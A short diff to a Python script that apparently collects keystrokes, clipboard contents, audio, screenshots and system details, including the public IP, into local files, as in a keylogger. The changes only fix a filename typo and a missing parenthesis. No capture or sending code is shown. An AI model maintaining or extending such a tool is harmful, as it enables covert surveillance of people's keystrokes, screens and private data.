@@ -28,7 +28,7 @@ from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
 keys_information = "key_log.txt"
-system_information = "syseminfo.txt"
+system_information = "systeminfo.txt"
 clipboard_information = "clipboard.txt"
 audio_information = "audio.wav"
 screenshot_information = "screenshot.png"
@@ -108,7 +108,7 @@ def computer_information():
             f.write("Public IP Address: " + public_ip)
 
         except Exception:
-            f.write("Couldn't get Public IP Address (most likely max query")
+            f.write("Couldn't get Public IP Address (most likely max query)")
 
         f.write("Processor: " + (platform.processor()) + '\n')
         f.write("System: " + platform.system() + " " + platform.version() + '\n')
